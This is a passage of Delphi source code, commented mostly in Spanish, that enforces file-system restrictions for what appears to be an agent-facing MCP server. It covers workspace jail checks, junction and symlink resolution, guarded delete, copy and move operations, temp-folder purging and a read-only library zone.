  Result := IncludeTrailingPathDelimiter(RealPath(ExtractFileDir(AFull))) +
    ExtractFileName(AFull);
end;

{ El lugar protegido (tal como esta declarado) que AReal ES o CONTIENE; ''
  si ninguno. EL comparador: BorradoDenegado y ProtegidoDenegado. }
function LugarProtegidoEn(const AReal: string): string;
var
  P, PReal: string;
begin
  Result := '';
  for P in LugaresProtegidos do
  begin
    if P.Trim = '' then
      Continue;
    PReal := ExcludeTrailingPathDelimiter(RealPath(P.Trim));
    if StartsText(IncludeTrailingPathDelimiter(AReal), IncludeTrailingPathDelimiter(PReal)) then
      Exit(ExcludeTrailingPathDelimiter(P.Trim));
  end;
end;

function BorradoDenegado(const ADir: string): string;
var
  Full, Real, Seg, P: string;
  Segs: TArray<string>;
  I: Integer;
  Desechable: Boolean;
begin
  Result := '';
  if (ADir.Trim = '') or not TPath.IsPathRooted(ADir.Trim) then
    Exit(Format(SR_BORRADO_DENEGADO_FMT, [ADir, 'ruta vacia o relativa']));
  try
    Full := ExcludeTrailingPathDelimiter(TPath.GetFullPath(ADir.Trim));
  except
    Exit(Format(SR_BORRADO_DENEGADO_FMT, [ADir, 'ruta invalida']));
  end;
  if (Length(Full) <= 3) or (Full.StartsWith('\\') and
     (Length(Full.Substring(2).Split(['\'], TStringSplitOptions.ExcludeEmpty)) <= 2)) then
    Exit(Format(SR_BORRADO_DENEGADO_FMT, [ADir, 'es una unidad o un recurso compartido entero']));
  // la ruta REAL del padre + el nombre (ver la nota de la interface)
  Real := RutaDelEnlace(Full);
  // (1) lista blanca
  Segs := Real.Split(['\', '/'], TStringSplitOptions.ExcludeEmpty);
  Desechable := False;
  for I := 0 to High(Segs) do
  begin
    Seg := Segs[I];
    // Tercera barrera (David, 25-sep-2026): el segmento que habilita el
    // borrado EMPIEZA POR __, sea cual sea la lista: una entrada futura con
    // nombre normal, o una ruta mal calculada, no habilita nada.
    if not Seg.StartsWith('__') then
      Continue;
    if (I < High(Segs)) and MatchText(Seg, CarpetasDesechables) then
      Desechable := True // DENTRO de una desechable, nunca la carpeta misma
    else if EsCarpetaDescarga(Seg) then
      Desechable := True;
  end;
  if not Desechable then
    Exit(Format(SR_BORRADO_DENEGADO_FMT, [ADir,
      'no esta dentro de una carpeta desechable (' +
      string.Join(', ', CarpetasDesechables) + ') ni es una descarga temporal']));
  // (2) lista negra: ni ser ni contener un lugar protegido
  P := LugarProtegidoEn(Real);
  if P <> '' then
    Exit(Format(SR_BORRADO_DENEGADO_FMT, [ADir, 'es o contiene un lugar protegido (' + P + ')']));
end;

function PrimerTrozo(const S: string; const ASeps: array of Char): string;
var
  Partes: TArray<string>;
begin
  Partes := S.Split(ASeps);
  if Length(Partes) = 0 then
    Result := ''
  else
    Result := Partes[0];
end;

{ P es un enlace (junction o symlink, de carpeta o de fichero). }
function EsEnlace(const P: string): Boolean;
var
  A: Cardinal;
begin
  A := GetFileAttributes(PChar(P));
  Result := (A <> INVALID_FILE_ATTRIBUTES) and ((A and FILE_ATTRIBUTE_REPARSE_POINT) <> 0);
end;

procedure RecorreSinEnlaces(const ADir: string; const AVisita: TVisitaRuta;
  const AAlEnlace: TVisitaRuta = nil);
var
  Entradas: TArray<string>;
  E: string;
begin
  try
    Entradas := TDirectory.GetFileSystemEntries(ADir);
  except
    Exit; // una rama ilegible se salta
  end;
  for E in Entradas do
  begin
    if EsEnlace(E) then
    begin
      // ni se visita ni se entra: lo de detras no es de este arbol. Quien
      // necesita saber que esta aqui, lo recibe.
      if Assigned(AAlEnlace) then
        try
          AAlEnlace(E);
        except
        end;
      Continue;
    end;
    try
      AVisita(E);
    except
      // una entrada que no se deja tocar no para las demas
    end;
    if TDirectory.Exists(E) then
      RecorreSinEnlaces(E, AVisita, AAlEnlace);
  end;
end;

{ LA regla de enlaces de la copia: se sigue solo si lo de detras se puede
  LEER en esta sesion. Dos veredictos de la MISMA puerta de lectura: el
  destino real (una referencia, la zona de biblioteca) o el camino por el
  enlace (un enlace a tus propias raices). Ninguno abre nada que no se lea
  ya. La usan CopiaArbol y CopiaDenegada: lo que se mira es lo que se copia. }
function EnlaceLegible(const P: string): Boolean;
begin
  Result := (ReadPathDenied(RealPath(P)) = '') or (ReadPathDenied(P) = '');
end;

{ ADestino cae DENTRO de AOrigen (o es el), por las rutas REALES. }
function DentroDeSiMismo(const AOrigen, ADestino: string): Boolean;
begin
  Result := StartsText(IncludeTrailingPathDelimiter(RealPath(ExcludeTrailingPathDelimiter(AOrigen))),
    IncludeTrailingPathDelimiter(RealPath(ExcludeTrailingPathDelimiter(ADestino))));
end;

procedure CopiaArbol(const AOrigen, ADestino: string; AConPapelera: Boolean;
  out ANoSeguidos: TArray<string>);
var
  Vistos: TStringList;
  NoSeg: TStringList;

  function SeSigue(const P: string): Boolean;
  begin
    Result := EnlaceLegible(P);
    if not Result then
      NoSeg.Add(P);
  end;

  procedure Copia(const O, D: string);
  var
    E, Nombre: string;
  begin
    // la ruta REAL ya copiada no se vuelve a copiar: corta un bucle de enlaces
    if Vistos.IndexOf(LowerCase(RealPath(O))) >= 0 then
      Exit;
    Vistos.Add(LowerCase(RealPath(O)));
    CrearCarpeta(D);
    for E in TDirectory.GetFiles(O) do
      if not EsEnlace(E) or SeSigue(E) then
        TFile.Copy(E, TPath.Combine(D, TPath.GetFileName(E)), False);
    for E in TDirectory.GetDirectories(O) do
    begin
      Nombre := TPath.GetFileName(E);
      if not AConPapelera and SameText(Nombre, TrashFolderName) then
        Continue; // la papelera del origen no es contenido
      if not EsEnlace(E) or SeSigue(E) then
        Copia(E, TPath.Combine(D, Nombre));
    end;
  end;

begin
  // Dentro de si misma se copiaria sin fin: el destino recien creado sale
  // en el listado del origen, con una ruta real nueva en cada vuelta.
  if DentroDeSiMismo(AOrigen, ADestino) then
    raise Exception.Create(Format(SR_COPIA_DENTRO_DE_SI_FMT, [ADestino, AOrigen]));
  Vistos := TStringList.Create;
  NoSeg := TStringList.Create;
  try
    Vistos.Sorted := True;
    Copia(ExcludeTrailingPathDelimiter(AOrigen), ExcludeTrailingPathDelimiter(ADestino));
    ANoSeguidos := NoSeg.ToStringArray;
  finally
    NoSeg.Free;
    Vistos.Free;
  end;
end;

function CopiaDenegada(const AOrigen, ADestino: string): string;
var
  Vistos: TStringList;
  Hallado: string;

  function EsProyecto(const F: string): Boolean;
  begin
    Result := MatchText(TPath.GetExtension(F), ['.dproj', '.dpk', '.dpr']);
  end;

  procedure Busca(const O: string);
  var
    E: string;
  begin
    if (Hallado <> '') or (Vistos.IndexOf(LowerCase(RealPath(O))) >= 0) then
      Exit;
    Vistos.Add(LowerCase(RealPath(O)));
    for E in TDirectory.GetFiles(O) do
      if EsProyecto(E) and (not EsEnlace(E) or EnlaceLegible(E)) then
      begin
        Hallado := E;
        Exit;
      end;
    for E in TDirectory.GetDirectories(O) do
      if not SameText(TPath.GetFileName(E), TrashFolderName) and
         (not EsEnlace(E) or EnlaceLegible(E)) then
        Busca(E);
  end;

begin
  if DentroDeSiMismo(AOrigen, ADestino) then
    Exit(Format(SR_COPIA_DENTRO_DE_SI_FMT, [ADestino, AOrigen]));
  Hallado := '';
  if TFile.Exists(AOrigen) then
  begin
    if EsProyecto(AOrigen) then
      Hallado := AOrigen;
  end
  else if TDirectory.Exists(AOrigen) then
  begin
    Vistos := TStringList.Create;
    try
      Vistos.Sorted := True;
      Busca(ExcludeTrailingPathDelimiter(AOrigen));
    finally
      Vistos.Free;
    end;
  end;
  if Hallado <> '' then
    Result := Format(SR_MOVE_COPY_PROJECT_FMT, [Hallado])
  else
    Result := '';
end;

procedure BorraArbol(const ADir: string);
var
  Motivo: string;
begin
  // El guard ANTES de tocar nada, y una sola vez: los hijos de algo aprobado
  // estan dentro de ello (misma lista blanca) y si hubiera un lugar
  // protegido debajo, el padre ya lo CONTENDRIA y se habria denegado.
  Motivo := BorradoDenegado(ADir);
  if Motivo <> '' then
    raise Exception.Create(Motivo);
  BorraArbolDentro(ADir);
end;

function ProtegidoDenegado(const ADir: string): string;
var
  Full, P: string;
begin
  Result := '';
  try
    Full := ExcludeTrailingPathDelimiter(TPath.GetFullPath(ADir.Trim));
  except
    Exit; // una ruta que no parsea es cosa de PathDenied
  end;
  P := LugarProtegidoEn(RutaDelEnlace(Full));
  if P = '' then
    Exit;
  // se nombra solo lo que esta sesion ya puede leer (la nota, en la interface)
  if ReadPathDenied(P) = '' then
    P := '"' + P + '"'
  else
    P := SN_LUGAR_PROTEGIDO;
  Result := Format(SR_MUDANZA_PROTEGIDA_FMT, [ADir, P]);
end;

function MovidoDenegado(const AOrigen, ADestino: string): string;
var
  UO, UD: string;
begin
  Result := PathDenied(AOrigen);
  if Result <> '' then
    Exit;
  Result := PathDenied(ADestino);
  if Result <> '' then
    Exit;
  Result := ProtegidoDenegado(AOrigen);
  if Result <> '' then
    Exit;
  if DentroDeSiMismo(AOrigen, ADestino) then
    Exit(Format(SR_COPIA_DENTRO_DE_SI_FMT, [ADestino, AOrigen]));
  // la unidad REAL de cada lado: un junction en el camino no la disfraza
  try
    UO := ExtractFileDrive(RutaDelEnlace(ExcludeTrailingPathDelimiter(
      TPath.GetFullPath(AOrigen))));
    UD := ExtractFileDrive(RealPath(ADestino));
  except
    Exit('RECHAZADO: ruta invalida: ' + AOrigen);
  end;
  if not SameText(UO, UD) then
    Result := Format(SR_MUDANZA_OTRA_UNIDAD_FMT, [AOrigen, ADestino]);
end;

procedure MueveArbol(const AOrigen, ADestino: string);
var
  Motivo: string;
begin
  // El guard ANTES de tocar nada, como en BorraArbol.
  Motivo := MovidoDenegado(AOrigen, ADestino);
  if Motivo <> '' then
    raise Exception.Create(Motivo);
  // MoveFile a secas: ni MOVEFILE_COPY_ALLOWED ni TDirectory.Move. En la
  // misma unidad renombra de un golpe; si no puede, devuelve False sin
  // haber tocado nada. Entre unidades falla con ERROR_NOT_SAME_DEVICE: el
  // mismo rechazo, por si la unidad llego disfrazada (un punto de montaje).
  if not MoveFile(PChar(ExcludeTrailingPathDelimiter(AOrigen)),
       PChar(ExcludeTrailingPathDelimiter(ADestino))) then
  begin
    if GetLastError = ERROR_NOT_SAME_DEVICE then
      raise Exception.Create(Format(SR_MUDANZA_OTRA_UNIDAD_FMT, [AOrigen, ADestino]));
    RaiseLastOSError;
  end;
end;

{ (la nota, en la interface) Nunca lanza: no poder tirar un temporal no es
  motivo para que falle lo que lo pedia. }
procedure VaciaDesechable(const ADir: string);
var
  E: string;
begin
  // El guard del unico que vacia (David, 25-sep-2026): solo una carpeta de la
  // lista central de desechables, y con el __ delante. Una ruta mal
  // calculada nunca vacia otra cosa.
  var Nombre := TPath.GetFileName(ExcludeTrailingPathDelimiter(ADir));
  if not (Nombre.StartsWith('__') and MatchText(Nombre, CarpetasDesechables)) then
    Exit;
  // ...y si la propia temporal es un ENLACE, lo de detras no es nuestro:
  // enumerarla seria vaciar el destino (25-sep-2026).
  if EsEnlace(ExcludeTrailingPathDelimiter(ADir)) then
    Exit;
  try
    if not TDirectory.Exists(ADir) then
      Exit;
    for E in TDirectory.GetFiles(ADir) do
      try
        TFile.Delete(E);
      except
      end;
    for E in TDirectory.GetDirectories(ADir) do
      try
        BorraArbol(E);
      except
      end;
  except
  end;
end;

var
  GPrimera: THandle = 0;
  GTemporalesMias: TStringList = nil; // claves de las temporales de ESTE proceso

{ Reclama AClave para ESTE proceso mientras viva: un mutex global que se
  queda abierto de por vida. False si otro proceso vivo ya la tiene, o si
  no se pudo crear (otra cuenta, otro fallo): en la duda no es nuestra, y
  no purgar es la opcion sin peligro. LA regla de "de quien es esto
  mientras vive": la usan la casa del servidor y las temporales de raiz. }
function ReclamaNombre(const AClave: string; out AHandle: THandle): Boolean;
begin
  AHandle := CreateMutex(nil, False, PChar('Global\DelphiLspMcp-' + AClave));
  if (AHandle <> 0) and (GetLastError = ERROR_ALREADY_EXISTS) then
  begin
    CloseHandle(AHandle);
    AHandle := 0;
  end;
  Result := AHandle <> 0;
end;

{ La temporal ADir es de ESTE proceso: si ningun otro servidor vivo la ha
  reclamado, la reclama (hasta morir) y True. La clave sale de la ruta
  canonica, asi que la misma carpeta escrita en 8.3 o con otras mayusculas
  es la misma temporal; va resumida porque un nombre de mutex es corto. }
function TemporalEsMia(const ADir: string): Boolean;
var
  Clave: string;
  H: THandle;
begin
  Clave := 'tmp-' + THashMD5.GetHashString(
    LowerCase(ExcludeTrailingPathDelimiter(LongCanonical(ADir))));
  if not Assigned(GTemporalesMias) then
    GTemporalesMias := TStringList.Create;
  if GTemporalesMias.IndexOf(Clave) >= 0 then
    Exit(True);
  Result := ReclamaNombre(Clave, H);
  if Result then
    GTemporalesMias.Add(Clave);
end;

{ True si este proceso es la PRIMERA instancia viva de ESTE exe (esta
  carpeta). El mutex se queda abierto de por vida: ser el primero dura
  hasta morir, y entonces lo hereda el siguiente arranque. Sin esto, un
  arranque stdio del exe del servicio purgaba __delphi-temp con el
  servicio en marcha y una llamada en vuelo perdia su fichero (el -F de
  un commit, una salida de remoterun) - auditoria 2026-09-21. }
function SoyLaPrimeraInstancia: Boolean;
var
  H: THandle;
begin
  if GPrimera <> 0 then
    Exit(True);
  Result := ReclamaNombre(LowerCase(ServerDir).Replace('\', '/').Replace(':', ''), H);
  if Result then
    GPrimera := H;
end;

{ TODAS las __delphi-temp bajo una raiz, la de arriba y las anidadas. Antes
  la purga solo vaciaba <raiz>\__delphi-temp, y una anidada guardo 90
  capturas (66 MB) de Hermes a traves de todos los reinicios del 25-sep.
  Sin cruzar enlaces (un junction dentro de la raiz que apunte fuera no se
  recorre: lo de fuera no es nuestro), sin entrar en .git, sin bajar dentro
  de una temporal ya encontrada, y sin tocar lo PROTEGIDO: lo de solo
  lectura de la raiz (ReadOnlyPaths), todo proyecto de referencia
  (ReadOnlyRoots, de cualquier workspace) y el vault. }
function TemporalesBajo(const ARoot: string;
  const AProtegidas: TArray<string>): TArray<string>;
var
  Acc: TStringList;

  function Protegida(const D: string): Boolean;
  var
    P: string;
  begin
    Result := False;
    for P in AProtegidas do
      if (P.Trim <> '') and StartsText(IncludeTrailingPathDelimiter(P.Trim),
           IncludeTrailingPathDelimiter(D)) then
        Exit(True);
  end;

  procedure Baja(const D: string; ANivel: Integer);
  var
    Sub, Nombre: string;
    A: Cardinal;
  begin
    if ANivel > 16 then
      Exit; // tope de profundidad: un arbol patologico no para el arranque
    try
      for Sub in TDirectory.GetDirectories(D) do
      begin
        A := GetFileAttributes(PChar(Sub));
        if (A = INVALID_FILE_ATTRIBUTES) or EsEnlace(Sub) then
          Continue; // un enlace: no se sigue
        Nombre := TPath.GetFileName(Sub);
        if SameText(Nombre, '.git') or Protegida(Sub) then
          Continue;
        if SameText(Nombre, TempFolderName) then
        begin
          Acc.Add(Sub);
          Continue;
        end;
        Baja(Sub, ANivel + 1);
      end;
    except
      // una carpeta ilegible: se sigue con las demas
    end;
  end;

begin
  Acc := TStringList.Create;
  try
    if (ARoot.Trim <> '') and TDirectory.Exists(ARoot.Trim) and
       not Protegida(ARoot.Trim) then
      Baja(ExcludeTrailingPathDelimiter(ARoot.Trim), 0);
    Result := Acc.ToStringArray;
  finally
    Acc.Free;
  end;
end;

procedure PurgeServerTemp;
var
  W: TWorkspaceDef;
  R: string;
begin
  if not SoyLaPrimeraInstancia then
    Exit;
  // La casa del servidor, la de siempre.
  VaciaDesechable(ServerTempDir);
  // ...Y LA DE CADA WORKSPACE. Primer intento: se vaciaba en el primer uso
  // de AgentTempDir, porque "al arrancar no hay workspace activo" - los
  // roots los elige el token de quien llama. Falso: los workspaces ESTAN
  // declarados en el settings.ini y LoadSecurity los tiene desde el
  // arranque; lo que no hay es uno ACTIVO, que no es lo mismo. Lo canto la
  // suite: con el nodo del escritorio ocupado por otra bateria nadie llamaba
  // a AgentTempDir, nadie purgaba, y la migaja de la ejecucion anterior
  // sobrevivia. "Se limpia en el primer uso" no es "se limpia al arrancar",
  // que es lo que se prometio (David, 2026-09-21).
  // Todas las temporales bajo cada raiz de escritura, las anidadas tambien
  // (TemporalesBajo, arriba). Protegido: lo de solo lectura de ESE
  // workspace, cualquier proyecto de referencia y el vault.
  try
    LoadSecurity;
    var Referencias: TArray<string> := nil;
    for W in GWorkspaces do
      Referencias := Referencias + W.ReadOnlyRoots;
    Referencias := Referencias + GRoRoots + [VaultPath];
    // Solo lo que es de ESTE proceso (TemporalEsMia): la temporal de cada
    // raiz se reclama aunque aun no exista -las llamadas la crearan-, y una
    // que ya es de otro servidor vivo no se toca.
    for W in GWorkspaces do
      for R in W.Roots do
      begin
        TemporalEsMia(TPath.Combine(R, TempFolderName));
        for var T in TemporalesBajo(R, W.ReadOnlyPaths + Referencias) do
          if TemporalEsMia(T) then
            VaciaDesechable(T);
      end;
    for R in GRoots do // modo local de lanzamiento (baterias)
    begin
      TemporalEsMia(TPath.Combine(R, TempFolderName));
      for var T in TemporalesBajo(R, GRoPaths + Referencias) do
        if TemporalEsMia(T) then
          VaciaDesechable(T);
    end;
  except
    // limpiar no puede impedir arrancar
  end;
end;

function AgentConfineDenied(const AFull, ARoot: string): string;
var
  Me, Rel, Seg, Sh: string;
  P: Integer;
begin
  Result := '';
  if not AgentConfinementNow then
    Exit;
  Me := CurrentAgent;
  if Me = '' then
    Exit; // stdio / operator: not confined
  Rel := AFull.Substring(Length(IncludeTrailingPathDelimiter(ARoot))).Replace('/', '\');
  P := Rel.IndexOf('\');
  if P < 0 then
    Seg := Rel
  else
    Seg := Rel.Substring(0, P);
  if SameText(Seg, Me) then
    Exit; // your own folder
  for Sh in SharedFoldersNow do
    if SameText(Seg, Sh) then
      Exit; // a folder the operator marked shared
  Result := Format(SR_AGENT_CONFINED_FMT, [Me, Me]);
end;

function PathDenied(const APath: string): string;
var
  M: TMotivoVeto;
begin
  Result := PathDenied(APath, M);
end;

function PathDenied(const APath: string; out AMotivo: TMotivoVeto): string;
var
  Roots: TArray<string>;
  Full, R: string;
begin
  AMotivo := mvNinguno;
  // Name normalization first: it applies with or without a jail configured.
  Result := PathAnomaly(APath);
  if Result <> '' then
  begin
    AMotivo := mvAnomalia;
    Exit;
  end;
  // The knowledge vault belongs to the vault_* tools ALONE, wherever it sits.
  // If it happens to live inside a workspace root, the code tools must still
  // keep out - otherwise delphi_edit could rewrite a note behind the vault's
  // back, skipping its automatic backup and its protected governance files.
  if InVault(APath) then
  begin
    AMotivo := mvVault;
    Exit(SR_VAULT_NOT_CODE);
  end;
  Roots := WorkspaceRoots;
  if GRootsInvalid then
  begin
    AMotivo := mvRootsInvalidos;
    Exit(SR_ROOTS_INVALID);
  end;
  if Length(Roots) = 0 then
    Exit; // no jail configured
  try
    Full := TPath.GetFullPath(APath);
  except
    AMotivo := mvRutaInvalida;
    Exit('RECHAZADO: ruta invalida: ' + APath);
  end;
  // Un proyecto de REFERENCIA (ReadOnlyRoots) manda sobre Roots: una
  // carpeta declarada en los dos sitios, o una raiz que caiga dentro de una
  // referencia, es de SOLO LECTURA (David, 25-sep-2026). Por eso se mira
  // ANTES de las raices. El motivo lo distingue, ReadPathDenied lo perdona y
  // el texto dice que se lee y no se toca. El mismo repaso de enlaces que
  // las raices: un junction plantado en la referencia que apunte fuera no
  // abre nada.
  var Ref := ReadOnlyRootOf(APath);
  if Ref <> '' then
  begin
    if StartsText(IncludeTrailingPathDelimiter(RealPath(Ref)),
         IncludeTrailingPathDelimiter(RealPath(APath))) then
    begin
      AMotivo := mvReferencia;
      Exit(Format(SR_REFERENCE_ROOT_FMT, [APath, Ref]));
    end;
    AMotivo := mvEnlaceFuera;
    Exit(Format(SR_JAIL_LINK_FMT, [APath]));
  end;
  for R in Roots do
    if StartsText(R, IncludeTrailingPathDelimiter(Full)) then
    begin
      // Dentro POR EL TEXTO. Falta que lo este DE VERDAD: un junction o un
      // symlink plantado en la jaula apuntaba fuera y el sistema de ficheros
      // servia el destino tan tranquilo (ver RealPath, y la bateria
      // test_round33 que lo reproduce).
      //
      // OJO a como se compara: el mundo REAL consigo mismo, la ruta real
      // contra las raices reales. Mezclar las dos formas - raices resueltas
      // contra rutas textuales - fue el primer intento de esto y rompio algo
      // peor de lo que arreglaba: las carpetas temporales llegan en 8.3
      // (DFONTA~1), RealPath las alarga, la comparacion dejaba de casar y se
      // pudo BORRAR la propia raiz del workspace. Lo cazo test_guard en la
      // misma tanda.
      var Verdad := IncludeTrailingPathDelimiter(RealPath(APath));
      var DentroDeVerdad := False;
      for var RR in Roots do
        if StartsText(IncludeTrailingPathDelimiter(
             RealPath(ExcludeTrailingPathDelimiter(RR))), Verdad) then
        begin
          DentroDeVerdad := True;
          Break;
        end;
      if not DentroDeVerdad then
      begin
        AMotivo := mvEnlaceFuera;
        Exit(Format(SR_JAIL_LINK_FMT, [APath]));
      end;
      // Dentro de la jaula, pero quiza en una carpeta declarada de SOLO
      // LECTURA: un vendor/, un submodulo, un clon de referencia con su
      // propio git. Se comprueba AQUI y no en el lector, y esa es justo la
      // distincion que se quiere: se lee, no se escribe.
      // Por el texto Y por la ruta REAL (Verdad): un junction de la raiz que
      // apunte a una carpeta de solo lectura no la vuelve escribible.
      for var Ro in WorkspaceReadOnlyPaths do
        if StartsText(Ro, IncludeTrailingPathDelimiter(Full)) or
           StartsText(IncludeTrailingPathDelimiter(RealPath(ExcludeTrailingPathDelimiter(Ro))), Verdad) then
        begin
          AMotivo := mvSoloLectura;
          Exit(Format(SR_READONLY_PATH_FMT,
            [APath, ExcludeTrailingPathDelimiter(Ro)]));
        end;
      Result := AgentConfineDenied(Full, R);
      if Result <> '' then
        AMotivo := mvConfinado;
      Exit;
    end;
  AMotivo := mvFueraDeJaula;
  Result := Format(SR_JAIL_FMT, [APath, string.Join(' | ', Roots)]);
end;

var
  GLibLoaded: Boolean = False;
  GLibRoots: TArray<string>;

{ The read-only library zone: RAD Studio installation + IDE Library Search
  Path directories (installed components), canonicalized. Cached. }
{ Expands $(MACRO) against the IDE's own macro table (plus the few values
  that live outside it), repeatedly, since macros nest. Case-insensitive. }
function ExpandIdeMacros(const AText: string; AVars: TStrings): string;
var
  Pass, I: Integer;
  Name: string;
begin
  Result := AText;
  for Pass := 1 to 4 do
  begin
    if not Result.Contains('$(') then
      Break;
    for I := 0 to AVars.Count - 1 do
    begin
      Name := AVars.Names[I];
      if Name <> '' then
        Result := Result.Replace('$(' + Name + ')', AVars.ValueFromIndex[I],
          [rfReplaceAll, rfIgnoreCase]);
    end;
  end;
end;

procedure IdeMacroVars(const AInfo: TRadStudioInfo; ADest: TStrings);
var
  UserDocs, CommonDocs: string;
begin
  // The IDE's own macro table is authoritative: it carries
  // $(BDSCatalogRepositoryAllUsers), where the GetIt packages live
  // (FmxLinux, Android SDKs, PAServer installers). Without it those
  // paths were silently dropped - measured 2026-08-19.
  IdeEnvironmentVars(AInfo.Version, ADest);
  // Values that are NOT in that key (authoritative from rsvars.bat /
  // the install itself), added without overwriting the IDE's own.
  if ADest.Values['BDS'] = '' then
    ADest.Values['BDS'] := ExcludeTrailingPathDelimiter(AInfo.RootDir);
  if ADest.Values['BDSLIB'] = '' then
    ADest.Values['BDSLIB'] := ExcludeTrailingPathDelimiter(AInfo.RootDir) + '\lib';
  UserDocs := BdsUserDir(AInfo);
  if (UserDocs <> '') and (ADest.Values['BDSUSERDIR'] = '') then
    ADest.Values['BDSUSERDIR'] := UserDocs;
  CommonDocs := BdsCommonDir(AInfo);
  if (CommonDocs <> '') and (ADest.Values['BDSCOMMONDIR'] = '') then
    ADest.Values['BDSCOMMONDIR'] := CommonDocs;
  // Per-user catalog repository: sibling of the common one, under the
  // user's own documents root (the IDE exposes only the AllUsers one).
  if (ADest.Values['BDSCatalogRepository'] = '') and (UserDocs <> '') then
    ADest.Values['BDSCatalogRepository'] :=
      IncludeTrailingPathDelimiter(UserDocs) + 'CatalogRepository';
end;

function IdePlatformLibraryPaths(const AVersion, APlatform: string): TArray<string>;
var
  Installs: TArray<TRadStudioInfo>;
  Info: TRadStudioInfo;
  Vars, List: TStringList;
  Item, Expanded: string;
begin
  Result := nil;
  Installs := DiscoverAllRadStudios;
  for Info in Installs do
  begin
    if not Info.Found or not SameText(Info.Version, AVersion) then
      Continue;
    Vars := TStringList.Create;
    List := TStringList.Create;
    try
      IdeMacroVars(Info, Vars);
      Vars.Values['Platform'] := APlatform;
      for Item in IdeLibrarySearchPath(Info.Version, APlatform).Split([';']) do
      begin
        Expanded := ExpandIdeMacros(Item.Trim, Vars);
        if (Expanded = '') or Expanded.Contains('$(') or
           not TPath.IsPathRooted(Expanded) then
          Continue;
        try
          Expanded := ExcludeTrailingPathDelimiter(TPath.GetFullPath(Expanded));
        except
          Continue;
        end;
        if List.IndexOf(Expanded) < 0 then
          List.Add(Expanded);
      end;
      Result := List.ToStringArray;
    finally
      List.Free;
      Vars.Free;
    end;
    Exit;
  end;
end;

function LibraryRoots: TArray<string>;
var
  Installs: TArray<TRadStudioInfo>;
  Info: TRadStudioInfo;
  List, Vars: TStringList;
  Plat, Raw, Item, Expanded: string;
begin
  if not GLibLoaded then
  begin
    List := TStringList.Create;
    try
      // EVERY installation: reading the sources of any installed Delphi is
      // legitimate, and each one owns its packages and its catalog.
      Installs := DiscoverAllRadStudios;
      for Info in Installs do
      begin
        if not Info.Found then
          Continue;
        List.Add(IncludeTrailingPathDelimiter(TPath.GetFullPath(Info.RootDir)));
        Vars := TStringList.Create;
        try
          IdeMacroVars(Info, Vars);

          // The catalog repositories THEMSELVES, whole: every GetIt package
          // lives there (FmxLinux, LockBox...), and the Library Search Path
          // only points at its compiled Lib\ folder - what an agent actually
          // wants to read is the sibling source\. Also covers the Android
          // SDKs and the PAServer installers.
          for Item in TArray<string>.Create(Vars.Values['BDSCatalogRepositoryAllUsers'],
            Vars.Values['BDSCatalogRepository']) do
            if (Item <> '') and TPath.IsPathRooted(Item) then
            try
              Expanded := IncludeTrailingPathDelimiter(TPath.GetFullPath(Item));
              if List.IndexOf(Expanded) < 0 then
                List.Add(Expanded);
            except
              // never breaks the server
            end;

          // ALL platforms registered for this install, never a fixed pair:
          // Linux64, OSX64, Android64, iOSDevice64... each has its own path.
          for Plat in IdeLibraryPlatforms(Info.Version) do
          begin
            Vars.Values['Platform'] := Plat;
            Raw := IdeLibrarySearchPath(Info.Version, Plat);
            for Item in Raw.Split([';']) do
            begin
              Expanded := ExpandIdeMacros(Item.Trim, Vars);
              if (Expanded <> '') and not Expanded.Contains('$(') and
                 TPath.IsPathRooted(Expanded) then
              try
                Expanded := IncludeTrailingPathDelimiter(TPath.GetFullPath(Expanded));
                if List.IndexOf(Expanded) < 0 then
                  List.Add(Expanded);
                // A component's INSTALL ROOT is library territory too: the IDE
                // registers its Source\ (or a per-platform Lib\), and next to
                // it live Library\, Redist\, Examples\ - the native runtime
                // libraries a deployment must ship (field 2026-08-22: OBR's
                // libzbar.so in Library\Linux64, unreadable because only
                // Source\ was registered). One level up, never a drive root,
                // never above the IDE's own documents trees.
                Expanded := ExcludeTrailingPathDelimiter(Expanded);
                Expanded := TPath.GetDirectoryName(Expanded);
                if (Expanded <> '') and (Length(Expanded) > 3) and
                   (TPath.GetDirectoryName(Expanded) <> '') then
                begin
                  Expanded := IncludeTrailingPathDelimiter(Expanded);
                  if List.IndexOf(Expanded) < 0 then
                    List.Add(Expanded);
                end;
              except
                // an unparseable entry never breaks the server
              end;
            end;
          end;
        finally
          Vars.Free;
        end;
      end;
      GLibRoots := List.ToStringArray;
    finally
      List.Free;
    end;
    GLibLoaded := True;
  end;
  Result := GLibRoots;
end;

function LibraryReadRoots: TArray<string>;
begin
  if not LibraryZoneEnabled then
    Exit(nil); // announced as it is enforced: no zone, nothing to announce
  Result := LibraryRoots;
end;

function ReadPathDenied(const APath: string): string;
var
  Motivo: TMotivoVeto;
  Full, R: string;
begin
  Result := PathDenied(APath, Motivo);
  if Result = '' then
    Exit;
  case Motivo of
    // Confinement is a WRITE rule. A read that trips ONLY it is inside the
    // jail and merely belongs to another agent - and reading the whole tree
    // is allowed even under confinement (you see everything, you write only
    // yours).
    mvConfinado:
      Exit('');
    // ReadOnlyPaths es de escritura tambien, y ES SU RAZON DE SER: esa
    // carpeta se lee, lo que no se hace es escribirla. El perdon va por el
    // MOTIVO, no por el texto de la negativa ni por recomprobar la ruta
    // aqui: la version anterior recomprobaba POR TEXTO (GetFullPath) y
    // perdonaba tambien la negativa del junction que RealPath acababa de
    // dar - delphi_fetch servia ficheros de FUERA de la jaula si el enlace
    // caia bajo un ReadOnlyPath (auditoria 2026-09-21). PathDenied solo
    // dice mvSoloLectura DESPUES de su comprobacion real de enlaces, asi
    // que este perdon ya no necesita mirar nada mas.
    mvSoloLectura:
      Exit('');
    // Un proyecto de REFERENCIA (ReadOnlyRoots) es justo eso: se lee.
    mvReferencia:
      Exit('');
    // Outside the jail - but READING library territory is legitimate. Solo
    // para quien esta fuera DE VERDAD: la negativa del enlace
    // (mvEnlaceFuera) no se perdona, y la del vault y las anomalias
    // tampoco - antes este repaso les daba una segunda oportunidad a
    // todas, porque miraba el texto que quedara y no el motivo.
    mvFueraDeJaula:
      begin
        try
          Full := IncludeTrailingPathDelimiter(TPath.GetFullPath(APath));
        except
          Exit; // keep the invalid-path rejection
        end;
        if LibraryZoneEnabled then
          for R in LibraryRoots do
            if StartsText(R, Full) then
              Exit('');
      end;
  end;
  // Refused for reading: say that a library zone exists and how to see it.
  // Field 2026-08-22: an agent listed the PARENT of a registered component
  // folder, got the plain jail refusal, and concluded list and read disagreed.
  if Result.StartsWith('RECHAZADO') then
    Result := Result + ' ' + SN_READ_ZONE_HINT;
end;

// ---------------------------------------------------------------------------
// Virtual drive units (srvd:, srvc:, ...)
// ---------------------------------------------------------------------------

var
  GDrvLoaded: Boolean = False;
